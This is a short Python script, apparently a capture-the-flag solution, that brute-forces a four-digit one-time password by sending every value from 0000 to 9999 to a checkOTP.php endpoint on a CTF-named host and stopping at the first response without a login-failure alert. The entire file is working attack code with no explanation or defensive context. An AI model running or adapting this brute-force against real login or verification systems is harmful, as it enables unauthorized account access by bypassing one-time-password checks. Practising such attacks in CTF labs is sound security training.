import requests

for i in range(10000):
    otp = str(i).zfill(4)

    response = requests.get("http://ctf.segfaulthub.com:1129/6/checkOTP.php", params={"otpNum": otp})
    
    if "alert('Login Fail...');" not in response.text:
        print(f"Success!: {otp}")
        break

print("End")
